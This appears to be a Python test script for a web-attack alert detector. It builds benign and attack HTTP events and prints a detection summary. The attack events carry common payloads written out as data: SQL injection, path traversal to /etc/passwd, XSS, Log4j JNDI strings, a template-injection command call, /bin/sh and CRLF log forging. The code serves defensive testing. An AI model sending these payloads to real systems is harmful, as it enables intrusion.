from __future__ import annotations

from demo_misconfig.infer_alerts import build_alert, detect_signal


BASE_EVENT = {
    "event_timestamp": "2026-04-30T00:00:00Z",
    "method": "GET",
    "host": "127.0.0.1",
    "client_ip": "127.0.0.1",
    "content_type": "",
    "request_has_authorization": False,
    "request_has_cookie": False,
    "response_body_size": 20,
}


def event(
    attack_type: str,
    label: str,
    path: str,
    query: str = "",
    status_code: int = 200,
    user_agent: str = "curl/8.0",
    cookie: bool = False,
    auth: bool = False,
) -> dict:
    return {
        **BASE_EVENT,
        "attack_type_expected": attack_type,
        "label_expected": label,
        "path": path,
        "path_template": path,
        "query": query,
        "status_code": status_code,
        "user_agent": user_agent,
        "request_has_cookie": cookie,
        "request_has_authorization": auth,
    }


def add_cases(cases: list[dict], attack_type: str, benign: list[dict], attacks: list[dict]) -> None:
    for item in benign:
        cases.append(event(attack_type, "benign", **item))
    for item in attacks:
        cases.append(event(attack_type, "attack", **item))


def build_cases() -> list[dict]:
    cases: list[dict] = []

    add_cases(
        cases,
        "SQL Injection",
        [
            {"path": "/orders/get/country", "query": "country=US"},
            {"path": "/orders/get/country", "query": "country=FR"},
        ],
        [
            {"path": "/orders/get/country", "query": "country=US' OR 1=1--"},
            {"path": "/api/search", "query": "q=' OR 1=1--", "status_code": 403},
        ],
    )
    add_cases(
        cases,
        "Directory Traversal",
        [
            {"path": "/static/download_txt/readme.txt"},
            {"path": "/static/download_txt/report.txt"},
        ],
        [
            {"path": "/static/download_txt/../../etc/passwd.txt"},
            {"path": "/static/download_txt/%2e%2e/%2e%2e/windows.ini.txt", "status_code": 403},
        ],
    )
    add_cases(
        cases,
        "XSS",
        [
            {"path": "/greet/alice", "query": "name=alice"},
            {"path": "/forum", "query": "message=hello"},
        ],
        [
            {"path": "/greet/bob", "query": "name=<script>alert(1)</script>"},
            {"path": "/forum", "query": "message=<img src=x onerror=alert(1)>", "status_code": 403},
        ],
    )
    add_cases(
        cases,
        "LOG4J",
        [
            {"path": "/forgot-password"},
            {"path": "/forgot-password", "query": "email=user@example.com"},
        ],
        [
            {"path": "/forgot-password", "user_agent": "${jndi:ldap://demo.local/a}"},
            {"path": "/forgot-password", "query": "next=${jndi:dns://demo.local/a}", "status_code": 403},
        ],
    )
    add_cases(
        cases,
        "RCE",
        [
            {"path": "/api/render", "query": "template=invoice"},
            {"path": "/api/tools", "query": "action=status"},
        ],
        [
            {"path": "/api/render", "query": 'template={{__import__("os").system("id")}}'},
            {"path": "/api/tools", "query": "cmd=/bin/sh", "status_code": 403},
        ],
    )
    add_cases(
        cases,
        "Log Forging",
        [
            {"path": "/api/comment", "query": "message=hello"},
            {"path": "/api/comment", "query": "message=normal-status"},
        ],
        [
            {"path": "/api/comment", "query": "message=ok%0aCRITICAL forged=true"},
            {"path": "/api/comment", "query": "message=ok%0dadmin=true", "status_code": 403},
        ],
    )
    add_cases(
        cases,
        "Cookie Injection",
        [
            {"path": "/cookielogin"},
            {"path": "/api/profile", "auth": True},
        ],
        [
            {"path": "/cookielogin", "cookie": True},
            {"path": "/cookielogin", "cookie": True, "status_code": 403},
        ],
    )
    return cases


def main() -> None:
    rows = []
    for index, item in enumerate(build_cases(), 1):
        signal, _ = detect_signal(item)
        alert = build_alert(item)
        model = item.get("model_prediction", {})
        rows.append(
            {
                "idx": index,
                "expected_type": item["attack_type_expected"],
                "label": item["label_expected"],
                "status": item["status_code"],
                "path": item["path"],
                "query": item["query"],
                "model_y_pred": model.get("y_pred"),
                "model_y_score": model.get("y_score"),
                "model_attack": model.get("predicted_attack_type"),
                "signal": signal,
                "alert": alert["severity"] if alert else "-",
            }
        )

    print("idx | expected | label  | status | y_pred | y_score | model_attack | signal | alert | path?query")
    print("-" * 170)
    for row in rows:
        score = "-" if row["model_y_score"] is None else f"{row['model_y_score']:.3f}"
        target = row["path"] + (f"?{row['query']}" if row["query"] else "")
        print(
            f"{row['idx']:>2} | {row['expected_type']:<19} | {row['label']:<6} | "
            f"{row['status']:<6} | {str(row['model_y_pred']):<6} | {score:<7} | "
            f"{str(row['model_attack']):<19} | {str(row['signal']):<19} | "
            f"{row['alert']:<8} | {target}"
        )

    print("\nSummary by attack type:")
    for attack_type in sorted({row["expected_type"] for row in rows}):
        group = [row for row in rows if row["expected_type"] == attack_type]
        benign = [row for row in group if row["label"] == "benign"]
        attacks = [row for row in group if row["label"] == "attack"]
        benign_alerts = sum(1 for row in benign if row["alert"] != "-")
        attack_model_hits = sum(1 for row in attacks if row["model_y_pred"] == 1)
        attack_alerts = sum(1 for row in attacks if row["alert"] != "-")
        print(
            f"- {attack_type}: benign alerts {benign_alerts}/2, "
            f"attack model y_pred=1 {attack_model_hits}/2, attack alerts {attack_alerts}/2"
        )


if __name__ == "__main__":
    main()
